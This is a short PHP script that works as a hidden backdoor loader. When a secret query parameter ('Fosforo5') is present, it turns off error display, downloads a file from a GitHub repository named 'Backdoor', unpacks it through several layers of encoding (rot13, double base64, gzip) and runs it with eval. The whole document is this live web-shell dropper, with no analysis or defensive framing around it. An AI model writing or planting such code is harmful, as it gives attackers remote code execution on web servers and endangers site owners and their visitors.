<?php
if(isset($_GET["Fosforo5"])){
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$fosforos= file_get_contents("https://raw.githubusercontent.com/Lesstisa/Backdoor/main/PHP/filemanager/ffm1.php?token=GHSAT0AAAAAAB234KLHOFMFR4RGLQPPOHCKY37FTUQ");
eval(gzinflate(base64_decode(base64_decode(str_rot13($fosforos)))));
}
?>
